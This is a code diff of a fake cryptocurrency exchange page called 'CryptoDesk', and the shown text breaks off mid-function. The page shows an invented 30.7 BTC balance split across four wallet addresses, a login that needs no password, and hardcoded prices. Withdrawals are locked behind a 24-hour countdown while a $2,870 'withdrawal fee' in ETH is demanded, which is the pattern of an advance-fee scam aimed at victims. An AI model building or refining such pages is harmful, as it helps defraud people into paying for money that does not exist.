@@ -17,6 +17,7 @@
             --text-dim: #8892b0;
             --green: #00e676;
             --red: #f50057;
+            --blue: #2196f3;
             --border: #1e2a47;
         }
 
@@ -34,17 +35,17 @@
             box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center;
         }
         .login-logo { font-size: 40px; color: var(--accent); margin-bottom: 20px; }
-        .login-input {
-            width: 100%; padding: 12px; margin-bottom: 15px;
-            background: var(--bg-dark); border: 1px solid var(--border);
-            color: white; border-radius: 5px; outline: none; text-align: center;
-        }
         .login-btn {
             width: 100%; padding: 12px; background: var(--accent);
             color: white; font-weight: bold; border: none; border-radius: 5px;
-            cursor: pointer; font-size: 16px; transition: 0.3s;
+            cursor: pointer; font-size: 16px; margin-top: 10px;
+            transition: all 0.3s ease;
         }
-        .login-btn:hover { background: var(--accent-hover); transform: translateY(-2px); }
+        .login-btn:hover { 
+            background: var(--accent-hover); 
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.3);
+        }
 
         /* --- Warning Banner --- */
         .withdrawal-warning {
@@ -54,39 +55,368 @@
             border-radius: 5px; display: flex; align-items: center; gap: 15px;
             animation: pulseWarning 2s infinite;
         }
-        @keyframes pulseWarning { 0%, 100% { opacity: 0.9; } 50% { opacity: 1; } }
+        @keyframes pulseWarning { 
+            0% { opacity: 0.7; } 
+            50% { opacity: 1; } 
+            100% { opacity: 0.7; } 
+        }
+        
+        .warning-icon {
+            color: var(--red);
+            font-size: 24px;
+        }
+        
+        .warning-content {
+            flex: 1;
+        }
+        
+        .warning-title {
+            color: var(--red);
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .warning-text {
+            font-size: 13px;
+            color: var(--text-main);
+        }
         
         .countdown-timer {
-            background: rgba(245, 0, 87, 0.4); padding: 8px 15px;
-            border-radius: 20px; font-family: monospace; font-weight: bold;
-            color: white; min-width: 120px; text-align: center;
+            background: rgba(245, 0, 87, 0.3);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-family: monospace;
+            font-weight: bold;
+            font-size: 14px;
+            color: white;
+            min-width: 120px;
+            text-align: center;
         }
 
-        /* --- Sidebar & Layout --- */
-        .sidebar { width: 240px; background: var(--bg-panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; }
-        .nav-item { padding: 15px 25px; cursor: pointer; color: var(--text-dim); display: flex; align-items: center; gap: 12px; }
-        .nav-item.active { background: rgba(255, 152, 0, 0.1); color: var(--accent); border-right: 3px solid var(--accent); }
+        /* --- Layout --- */
+        .sidebar { 
+            width: 240px; 
+            background: var(--bg-panel); 
+            border-right: 1px solid var(--border); 
+            display: flex; 
+            flex-direction: column; 
+            padding: 20px 0; 
+        }
         
-        .main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-        .top-bar { height: 70px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; padding: 0 30px; background: var(--bg-panel); }
+        .logo-area { 
+            padding: 0 20px 30px; 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            font-size: 20px; 
+            font-weight: bold; 
+            color: var(--accent); 
+        }
         
-        .action-btn { padding: 8px 20px; border-radius: 5px; font-weight: 600; cursor: pointer; border: none; transition: 0.2s; font-size: 14px; }
-        .btn-deposit { background: var(--green); color: #000; }
-        .btn-withdraw { background: var(--accent); color: white; }
+        .nav-item { 
+            padding: 15px 25px; 
+            cursor: pointer; 
+            color: var(--text-dim); 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            transition: all 0.2s;
+        }
+        
+        .nav-item:hover { 
+            background: rgba(255, 152, 0, 0.1); 
+            color: var(--accent); 
+        }
+        
+        .nav-item.active { 
+            background: rgba(255, 152, 0, 0.1); 
+            color: var(--accent); 
+            border-right: 3px solid var(--accent); 
+        }
+        
+        .main-content { 
+            flex: 1; 
+            display: flex; 
+            flex-direction: column; 
+            overflow: hidden; 
+        }
+        
+        .top-bar { 
+            height: 70px; 
+            border-bottom: 1px solid var(--border); 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 0 30px; 
+            background: var(--bg-panel); 
+        }
+        
+        .action-btns { 
+            display: flex; 
+            gap: 15px; 
+        }
+        
+        .action-btn { 
+            padding: 8px 20px; 
+            border-radius: 5px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            border: none; 
+            transition: all 0.2s;
+        }
+        
+        .btn-deposit { 
+            background: var(--green); 
+            color: #000; 
+        }
+        
+        .btn-deposit:hover { 
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 230, 118, 0.3);
+        }
+        
+        .btn-withdraw { 
+            background: var(--accent); 
+            color: white; 
+        }
+        
+        .btn-withdraw:hover { 
+            background: var(--accent-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 152, 0, 0.3);
+        }
 
-        .content-area { flex: 1; overflow-y: auto; padding: 30px; }
-        .card { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 8px; padding: 25px; margin-bottom: 20px; }
-        .tx-card { border-left: 5px solid var(--accent); position: relative; }
-        .big-amount { font-size: 42px; color: white; font-weight: 700; margin: 10px 0; }
+        .content-area { 
+            flex: 1; 
+            overflow-y: auto; 
+            padding: 30px; 
+        }
         
-        /* --- Modal --- */
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; display: none; justify-content: center; align-items: center; }
-        .modal-box { background: var(--bg-panel); width: 500px; border-radius: 10px; border: 1px solid var(--border); padding: 30px; position: relative; }
-        .close-modal { position: absolute; top: 15px; right: 15px; background: none; border: none; color: var(--text-dim); font-size: 24px; cursor: pointer; }
-        .form-input { width: 100%; padding: 12px; margin: 10px 0; background: var(--bg-dark); border: 1px solid var(--border); color: white; border-radius: 5px; }
+        .card { 
+            background: var(--bg-panel); 
+            border: 1px solid var(--border); 
+            border-radius: 8px; 
+            padding: 25px; 
+            margin-bottom: 20px; 
+        }
+        
+        .big-amount { 
+            font-size: 36px; 
+            color: white; 
+            font-weight: 700; 
+            margin: 10px 0; 
+        }
+        
+        .sub-amount { 
+            color: var(--text-dim); 
+            font-size: 18px; 
+        }
 
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
+        /* Transaction Card */
+        .tx-card { 
+            border-left: 5px solid var(--green); 
+            position: relative; 
+            overflow: hidden; 
+        }
+        
+        .tx-card::after {
+            content: ''; 
+            position: absolute; 
+            top: 0; 
+            right: 0; 
+            width: 100px; 
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 230, 118, 0.05));
+        }
+        
+        .tx-header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            margin-bottom: 20px; 
+        }
+        
+        .tx-status { 
+            background: rgba(0, 230, 118, 0.2); 
+            color: var(--green); 
+            padding: 5px 12px; 
+            border-radius: 15px; 
+            font-size: 12px; 
+            font-weight: bold; 
+        }
+
+        .tx-details-grid { 
+            display: grid; 
+            grid-template-columns: 1fr 1fr; 
+            gap: 15px; 
+            margin-top: 15px; 
+        }
+        
+        .detail-item label { 
+            display: block; 
+            font-size: 12px; 
+            color: var(--text-dim); 
+            margin-bottom: 4px; 
+        }
+        
+        .detail-item div { 
+            font-family: monospace; 
+            font-size: 14px; 
+            color: white; 
+        }
+
+        /* Wallet Distribution */
+        .wallet-distribution { 
+            margin-top: 20px; 
+        }
+        
+        .wallet-item {
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center;
+            padding: 12px; 
+            background: rgba(255,255,255,0.02); 
+            border-radius: 5px; 
+            margin-bottom: 8px;
+            border-left: 3px solid var(--accent);
+        }
+        
+        .wallet-address { 
+            font-family: monospace; 
+            font-size: 12px; 
+            color: var(--text-dim); 
+            flex: 2;
+        }
+        
+        .wallet-amount { 
+            font-weight: bold; 
+            color: white; 
+            flex: 1;
+            text-align: right;
+        }
+        
+        .wallet-label {
+            font-size: 11px; 
+            color: var(--accent); 
+            background: rgba(255,152,0,0.1); 
+            padding: 2px 8px; 
+            border-radius: 10px;
+            margin-left: 10px;
+        }
+
+        /* --- Modals --- */
+        .modal-overlay { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: rgba(0,0,0,0.8); 
+            z-index: 2000; 
+            display: none; 
+            justify-content: center; 
+            align-items: center; 
+        }
+        
+        .modal-box { 
+            background: var(--bg-panel); 
+            width: 500px; 
+            max-width: 90%;
+            border-radius: 10px; 
+            border: 1px solid var(--border); 
+            padding: 30px; 
+            position: relative; 
+        }
+        
+        .close-modal { 
+            position: absolute; 
+            top: 15px; 
+            right: 15px; 
+            background: none; 
+            border: none; 
+            color: var(--text-dim); 
+            font-size: 24px; 
+            cursor: pointer; 
+        }
+        
+        .modal-title { 
+            font-size: 22px; 
+            margin-bottom: 20px; 
+            color: var(--accent); 
+        }
+        
+        .form-group { 
+            margin-bottom: 20px; 
+        }
+        
+        .form-label { 
+            display: block; 
+            margin-bottom: 8px; 
+            color: var(--text-dim); 
+        }
+        
+        .form-input { 
+            width: 100%; 
+            padding: 12px; 
+            background: var(--bg-dark); 
+            border: 1px solid var(--border); 
+            color: white; 
+            border-radius: 5px; 
+            outline: none; 
+        }
+        
+        .form-input:focus { 
+            border-color: var(--accent); 
+        }
+        
+        .form-select {
+            width: 100%; 
+            padding: 12px; 
+            background: var(--bg-dark);
+            border: 1px solid var(--border); 
+            color: white; 
+            border-radius: 5px;
+        }
+
+        .balance-info { 
+            color: var(--text-dim); 
+            font-size: 14px; 
+            margin-top: 5px; 
+        }
+        
+        .eth-fee-box {
+            background: rgba(98, 126, 234, 0.1); 
+            border: 1px solid #627eea;
+            padding: 15px; 
+            border-radius: 5px; 
+            margin: 15px 0;
+        }
+
+        .fee-amount {
+            font-size: 18px;
+            font-weight: bold;
+            color: #627eea;
+        }
+
+        /* Quick Withdraw Section */
+        .quick-withdraw {
+            opacity: 0.5;
+        }
+        
+        .quick-withdraw .form-input,
+        .quick-withdraw .form-select,
+        .quick-withdraw .action-btn {
+            cursor: not-allowed;
+        }
+
+        /* Server Time */
+        .server-time {
+            font-family: monospace;
+            font-size: 14px;
+            color: var(--text-dim);
+        }
+
     </style>
 </head>
 <body>
@@ -94,155 +424,378 @@
     <div class="login-overlay" id="loginScreen">
         <div class="login-box">
             <div class="login-logo"><i class="fab fa-bitcoin"></i></div>
-            <h2>VIP Node Access</h2>
-            <p style="color: var(--text-dim); margin: 15px 0;">Network Key: 554$$@@#3$#$!!#@@!44234</p>
-            <input type="password" class="login-input" placeholder="Password (Optional)" value="00000000">
-            <button class="login-btn" onclick="authenticate()">CONNECT TO NETWORK</button>
+            <h2>VIP Portal Access</h2>
+            <p style="color: var(--text-dim); margin-top: 10px;">Network Node: 554$$@#3$#!@#@!44234</p>
+            <button class="login-btn" onclick="authenticate()">CONNECT</button>
         </div>
     </div>
 
+    <!-- Withdraw Modal -->
     <div class="modal-overlay" id="withdrawModal">
         <div class="modal-box">
-            <button class="close-modal" onclick="closeModal()">×</button>
-            <h2 style="color: var(--accent); margin-bottom: 20px;"><i class="fas fa-arrow-up"></i> Withdraw Assets</h2>
-            <label>Destination BTC Address</label>
-            <input type="text" class="form-input" placeholder="bc1q..." value="">
-            <label>Amount (BTC)</label>
-            <input type="number" class="form-input" value="30.70070032">
-            <div style="background: rgba(245, 0, 87, 0.1); padding: 10px; border-radius: 5px; margin-bottom: 15px; border: 1px solid var(--red);">
-                <p style="font-size: 12px; color: var(--red);">Security Note: High priority network fee applied.</p>
+            <button class="close-modal" onclick="closeModal('withdrawModal')">×</button>
+            <h2 class="modal-title"><i class="fas fa-arrow-up"></i> Withdraw Assets</h2>
+            
+            <!-- Warning in modal -->
+            <div class="withdrawal-warning" style="margin-bottom: 20px;">
+                <div class="warning-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                <div class="warning-content">
+                    <div class="warning-title">WITHDRAWALS TEMPORARILY DISABLED</div>
+                    <div class="warning-text">
+                        Due to high-volume swap bot activity, withdrawals have been disabled for 24 hours starting from 14:43 today.
+                        Time remaining: <span id="modalCountdown">24:00:00</span>
+                    </div>
+                </div>
             </div>
-            <button class="login-btn" onclick="confirmAction()">EXECUTE WITHDRAWAL</button>
+            
+            <div class="form-group">
+                <label class="form-label">Select Asset</label>
+                <select class="form-select" disabled>
+                    <option>Bitcoin (BTC)</option>
+                    <option>Ethereum (ETH)</option>
+                    <option>Tether (USDT)</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Withdrawal Address</label>
+                <input type="text" class="form-input" placeholder="Enter blockchain address" disabled>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Amount</label>
+                <input type="number" class="form-input" value="7.10041804" step="0.00000001" disabled>
+                <div class="balance-info">
+                    Available: 7.10041804 BTC
+                    <button style="margin-left: 10px; padding: 2px 8px; background: var(--border); border: none; color: white; border-radius: 3px; font-size: 12px; cursor: not-allowed;" disabled>MAX</button>
+                </div>
+            </div>
+
+            <div class="eth-fee-box">
+                <h4 style="color: #627eea; margin-bottom: 10px;">
+                    <i class="fab fa-ethereum"></i> Platform Withdrawal Fee
+                </h4>
+                <div class="fee-amount">$2,870.00 USD</div>
+                <div style="margin-top: 5px;">≈ 0.97106103 ETH</div>
+                <p style="margin-top: 10px; font-size: 12px; color: var(--text-dim);">
+                    This fee must be paid in ETH and will be deducted from your Ethereum balance.
+                    Current ETH price: $2,955.53
+                </p>
+            </div>
+
+            <button class="login-btn" style="background: var(--border); color: var(--text-dim); cursor: not-allowed;" disabled>
+                <i class="fas fa-ban"></i> WITHDRAWALS TEMPORARILY DISABLED
+            </button>
         </div>
     </div>
 
     <div class="main-content" id="appInterface" style="display: none; flex-direction: row;">
-        
         <div class="sidebar">
             <div class="logo-area"><i class="fab fa-bitcoin"></i> CryptoDesk</div>
-            <div class="nav-item active" onclick="switchTab('dashboard', this)"><i class="fas fa-th-large"></i> Dashboard</div>
-            <div class="nav-item" onclick="switchTab('trading', this)"><i class="fas fa-chart-line"></i> Trading</div>
-            <div class="nav-item" onclick="switchTab('wallet', this)"><i class="fas fa-wallet"></i> My Wallet</div>
-            <div style="margin-top: auto; padding: 20px; font-family: monospace; color: var(--green);">
-                <i class="fas fa-circle" style="font-size: 8px;"></i> SERVER: <span id="serverTime">00:00:00</span>
+            <div class="nav-item active" onclick="switchTab('dashboard')"><i class="fas fa-th-large"></i> Dashboard</div>
+            <div class="nav-item" onclick="switchTab('wallet')"><i class="fas fa-wallet"></i> My Wallet</div>
+            <div style="margin-top: auto; padding: 20px;">
+                <div style="font-size: 12px; color: var(--text-dim);">Server Time</div>
+                <div class="server-time" id="serverTime">00:00:00</div>
             </div>
         </div>
 
         <div class="main-content">
+            <!-- Warning Banner -->
             <div class="withdrawal-warning">
-                <div style="color: var(--red); font-size: 24px;"><i class="fas fa-exclamation-triangle"></i></div>
-                <div style="flex: 1;">
-                    <div style="color: var(--red); font-weight: bold; font-size: 14px;">SECURITY PROTOCOL ACTIVE</div>
-                    <div style="font-size: 12px; color: var(--text-main);">Withdrawals monitored by automated audit node.</div>
+                <div class="warning-icon"><i class="fas fa-exclamation-triangle"></i></div>
+                <div class="warning-content">
+                    <div class="warning-title">WITHDRAWALS TEMPORARILY DISABLED</div>
+                    <div class="warning-text">
+                        Due to high-volume swap bot activity, withdrawals have been disabled for 24 hours starting from 14:43 today.
+                    </div>
                 </div>
-                <div class="countdown-timer" id="countdown">23:59:59</div>
+                <div class="countdown-timer" id="countdown">24:00:00</div>
             </div>
 
             <div class="top-bar">
                 <div style="font-size: 18px; font-weight: 600;" id="pageTitle">Dashboard Overview</div>
-                <div style="display: flex; gap: 15px;">
-                    <button class="action-btn btn-deposit" onclick="confirmAction()">Deposit</button>
-                    <button class="action-btn btn-withdraw" onclick="openModal()">Withdraw</button>
+                <div class="action-btns">
+                    <button class="action-btn btn-deposit">Deposit</button>
+                    <button class="action-btn btn-withdraw" onclick="openWithdrawModal()" id="withdrawBtn">Withdraw</button>
                 </div>
             </div>
 
-            <div class="content-area tab-content active" id="dashboard">
+            <div class="content-area" id="dashboard">
+                <!-- Transaction Card -->
                 <div class="card tx-card">
-                    <div style="display: flex; justify-content: space-between;">
-                        <span style="color: var(--accent); font-weight: bold;"><i class="fas fa-sync fa-spin"></i> PENDING INCOMING</span>
-                        <span style="font-size: 12px; color: var(--text-dim);">Source: Mining Pool</span>
+                    <div class="tx-header">
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <i class="fas fa-check-circle" style="color: var(--green); font-size: 20px;"></i>
+                            <span style="font-size: 18px; font-weight: 600;">Transaction Completed</span>
+                        </div>
+                        <div class="tx-status">CONFIRMED & DISTRIBUTED</div>
                     </div>
-                    <div class="big-amount">30.70070032 BTC</div>
-                    <div style="color: var(--green); font-size: 20px; font-weight: bold;" id="usdEquivalent">≈ $2,746,878.84</div>
                     
-                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; border-top: 1px solid var(--border); padding-top: 20px;">
-                        <div>
-                            <label style="color: var(--text-dim); font-size: 12px;">NODE STATUS</label>
-                            <div style="color: var(--green); font-weight: bold;">CONNECTED [SVR-884]</div>
+                    <div class="big-amount">30.700700 BTC</div>
+                    <div class="sub-amount">≈ $2,746,878.848</div>
+
+                    <div class="tx-details-grid">
+                        <div class="detail-item">
+                            <label>SENDER (SOURCE)</label>
+                            <div style="color: var(--green); font-weight: bold;"><i class="fas fa-server"></i> SERVER NODE [54858455222]</div>
                         </div>
-                        <div style="text-align: right;">
-                            <label style="color: var(--text-dim); font-size: 12px;">ELAPSED TIME</label>
-                            <div id="timeElapsed">411 mins ago</div>
+                        <div class="detail-item">
+                            <label>DESTINATION (BATCH)</label>
+                            <div style="color: var(--accent);">Multi-Sig Distribution (4 Wallets)</div>
+                        </div>
+                    </div>
+
+                    <div class="wallet-distribution">
+                        <h4 style="margin: 20px 0 10px; color: var(--text-dim); font-size: 14px;">Distribution to 4 Multi-Sig Wallets:</h4>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU</div>
+                            <span class="wallet-label">Primary Vault</span>
+                            <div class="wallet-amount">7.10041804 BTC</div>
+                        </div>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR</div>
+                            <span class="wallet-label">Secondary</span>
+                            <div class="wallet-amount">7.20014379 BTC</div>
+                        </div>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4</div>
+                            <span class="wallet-label">Cold Storage</span>
+                            <div class="wallet-amount">7.30013849 BTC</div>
+                        </div>
+                        
+                        <div class="wallet-item">
+                            <div class="wallet-address">1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74</div>
+                            <span class="wallet-label">Legacy Wallet</span>
+                            <div class="wallet-amount">9.10000000 BTC</div>
+                        </div>
+                        
+                        <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border); text-align: right;">
+                            <div style="font-size: 16px; color: var(--text-dim);">
+                                Total Distributed: <span style="color: var(--accent); font-weight: bold; font-size: 18px;">30.70070032 BTC</span>
+                            </div>
                         </div>
                     </div>
                 </div>
 
-                <div class="card">
-                    <h3>Market Live Feed</h3>
-                    <div style="display: flex; gap: 30px; margin-top: 15px;">
-                        <div>
-                            <div style="color: var(--text-dim); font-size: 12px;">BTC/USDT</div>
-                            <div id="btcPrice" style="font-size: 24px; font-weight: bold;">$95,432.10</div>
+                <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 20px;">
+                    <div class="card">
+                        <h3 style="margin-bottom: 20px; font-weight: 500;">Bitcoin Market (Real-Time)</h3>
+                        <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 20px;">
+                            <div style="font-size: 32px; font-weight: bold;">$89,472.84</div>
+                            <div style="font-size: 18px; color: var(--green);">+2.45%</div>
                         </div>
-                        <div>
-                            <div style="color: var(--text-dim); font-size: 12px;">24h Change</div>
-                            <div id="btcChange" style="color: var(--green); font-weight: bold;">+2.45%</div>
+                        <div style="height: 150px; background: rgba(0,0,0,0.2); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--text-dim);">
+                            [Live Price Chart Display]
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <h3 style="margin-bottom: 20px; font-weight: 500;">Quick Withdraw</h3>
+                        <div class="quick-withdraw">
+                            <div class="form-group">
+                                <label class="form-label">Bitcoin (BTC)</label>
+                                <input type="text" class="form-input" placeholder="Enter destination address" disabled>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label">Amount</label>
+                                <div style="display: flex; gap: 10px;">
+                                    <input type="text" class="form-input" value="7.10041804" disabled style="flex: 1;">
+                                    <button class="action-btn" style="background: var(--border); color: white; cursor: not-allowed;" disabled>MAX</button>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label">Network</label>
+                                <select class="form-select" disabled>
+                                    <option>Ethereum ERC20</option>
+                                    <option>Bitcoin Network</option>
+                                </select>
+                            </div>
+                            
+                            <div class="eth-fee-box" style="margin: 20px 0;">
+                                <h4 style="color: #627eea; font-size: 14px;">Platform Withdrawal Fee</h4>
+                                <div style="font-size: 16px; font-weight: bold;">$2,870.00 USD</div>
+                                <div>≈ 0.97106103 ETH</div>
+                            </div>
+                            
+                            <button class="login-btn" style="background: var(--border); color: var(--text-dim); cursor: not-allowed;" disabled>
+                                <i class="fas fa-ban"></i> WITHDRAWALS DISABLED
+                            </button>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div class="content-area tab-content" id="wallet">
+            <div class="content-area" id="wallet" style="display: none;">
+                <h2 style="font-size: 22px; margin-bottom: 20px; font-weight: 500;">Wallet Balances</h2>
+                
                 <div class="card">
-                    <h3>Wallet Funds</h3>
-                    <p style="color: var(--text-dim); margin-top: 10px;">Confirmed Balance: 0.00 BTC</p>
-                    <p style="color: var(--accent); margin-top: 5px;">Pending Balance: 30.70070032 BTC</p>
+                    <div style="overflow-x: auto;">
+                        <table style="width: 100%; border-collapse: collapse;">
+                            <thead>
+                                <tr>
+                                    <th style="text-align: left; padding: 12px; color: var(--text-dim); border-bottom: 1px solid var(--border);">Address / Wallet</th>
+                                    <th style="text-align: left; padding: 12px; color: var(--text-dim); border-bottom: 1px solid var(--border);">Label</th>
+                                    <th style="text-align: left; padding: 12px; color: var(--text-dim); border-bottom: 1px solid var(--border);">Balance (BTC)</th>
+                                    <th style="text-align: left; padding: 12px; color: var(--text-dim); border-bottom: 1px solid var(--border);">ETH Balance</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-family: monospace; color: var(--accent);">1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border);">Primary Vault</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-weight: bold; color: white;">7.10041804</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); color: #627eea; font-weight: bold;">0.50000000</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-family: monospace;">1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border);">Secondary</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-weight: bold; color: white;">7.20014379</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); color: #627eea; font-weight: bold;">0.00000000</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-family: monospace;">12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border);">Cold Storage</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-weight: bold; color: white;">7.30013849</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); color: #627eea; font-weight: bold;">2.10000000</td>
+                                </tr>
+                                <tr>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-family: monospace;">1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border);">Legacy Wallet</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); font-weight: bold; color: white;">9.10000000</td>
+                                    <td style="padding: 15px 12px; border-bottom: 1px solid var(--border); color: #627eea; font-weight: bold;">0.80000000</td>
+                                </tr>
+                                <tr style="background: rgba(0, 230, 118, 0.1);">
+                                    <td colspan="2" style="padding: 15px 12px; text-align: right; color: var(--text-dim); font-weight: bold;">TOTAL CONFIRMED:</td>
+                                    <td style="padding: 15px 12px; color: var(--green); font-weight: bold; font-size: 16px;">30.70070032 BTC</td>
+                                    <td style="padding: 15px 12px; color: #627eea; font-weight: bold; font-size: 16px;">3.40000000 ETH</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
-
         </div>
     </div>
 
     <script>
+        // CONFIGURATION
+        const CONFIG = {
+            btcAmount: 30.70070032,
+            btcPrice: 89472.84,
+            ethPrice: 2955.53,
+            withdrawalFeeUSD: 2870.00,
+            withdrawalStartTime: new Date().setHours(14, 43, 0, 0),
+            withdrawalDuration: 24 * 60 * 60 * 1000
+        };
+
+        // AUTHENTICATION
         function authenticate() {
             document.getElementById('loginScreen').style.display = 'none';
             document.getElementById('appInterface').style.display = 'flex';
-            startSystem();
+            initApp();
         }
 
-        function openModal() { document.getElementById('withdrawModal').style.display = 'flex'; }
-        function closeModal() { document.getElementById('withdrawModal').style.display = 'none'; }
-        
-        function confirmAction() {
-            alert("Action Processed. Awaiting Blockchain Confirmation.");
-            closeModal();
+        // APP INITIALIZATION
+        function initApp() {
+            startClock();
+            startWithdrawalCountdown();
         }
 
-        function switchTab(tabId, el) {
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            el.classList.add('active');
-            document.getElementById('pageTitle').innerText = tabId.charAt(0).toUpperCase() + tabId.slice(1);
+        // TAB SWITCHING
+        function switchTab(tabId) {
+            // Hide all tabs
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('wallet').style.display = 'none';
+            
+            // Show selected tab
+            document.getElementById(tabId).style.display = 'block';
+            
+            // Update active nav item
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            event.target.closest('.nav-item').classList.add('active');
+            
+            // Update page title
+            const titles = {
+                'dashboard': 'Dashboard Overview',
+                'wallet': 'Wallet Balances'
+            };
+            document.getElementById('pageTitle').innerText = titles[tabId];
         }
 
-        function startSystem() {
-            // تحديث الساعة
-            setInterval(() => {
-                document.getElementById('serverTime').innerText = new Date().toLocaleTimeString();
-            }, 1000);
+        // MODAL FUNCTIONS
+        function openWithdrawModal() {
+            // Withdrawals are disabled, show warning
+            alert("Withdrawals are temporarily disabled for 24 hours due to high-volume swap bot activity.\n\nTime remaining: " + document.getElementById('countdown').innerText);
+        }
 
-            // العداد التنازلي
-            let h=23, m=59, s=59;
-            setInterval(() => {
-                s--; if(s<0){s=59; m--;} if(m<0){m=59; h--;}
-                document.getElementById('countdown').innerText = 
-                    `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-            }, 1000);
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
 
-            // جلب أسعار حقيقية (Binance API)
-            async function updateMarket() {
-                try {
-                    const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
-                    const data = await res.json();
-                    const price = parseFloat(data.price);
-                    document.getElementById('btcPrice').innerText = `$${price.toLocaleString()}`;
-                    document.getElementById('usdEquivalent').innerText = `≈ $${(price * 30.7007).toLocaleString()}`;
-                } catch(e) {}
+        // WITHDRAWAL COUNTDOWN
+        function startWithdrawalCountdown() {
+            const startTime = CONFIG.withdrawalStartTime;
+            const endTime = startTime + CONFIG.withdrawalDuration;
+            
+            function updateCountdown() {
+                const now = new Date().getTime();
+                const timeLeft = endTime - now;
+                
+                if (timeLeft > 0) {
+                    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+                    
+                    const formattedTime = 
+                        `${hours.toString().padStart(2, '0')}:` +
+                        `${minutes.toString().padStart(2, '0')}:` +
+                        `${seconds.toString().padStart(2, '0')}`;
+                    
+                    document.getElementById('countdown').innerText = formattedTime;
+                    document.getElementById('modalCountdown').innerText = formattedTime;
+                } else {
+                    // Countdown finished
+                    document.querySelector('.withdrawal-warning').style.display = 'none';
+                    document.getElementById('withdrawBtn').onclick = function() {
+                        document.getElementById('withdrawModal').style.display = 'flex';
+                    };
+                    document.getElementById('withdrawBtn').innerHTML = '<i class="fas fa-arrow-up"></i> Withdraw';
+                }
             }
-            updateMarket();
-            setInterval(updateMarket, 10000);
+            
+            updateCountdown();
+            setInterval(updateCountdown, 1000);
         }
+
+        // SERVER CLOCK
+        function startClock() {
+            function updateTime() {
+                const now = new Date();
+                document.getElementById('serverTime').innerText = 
+                    now.getHours().toString().padStart(2, '0') + ':' +
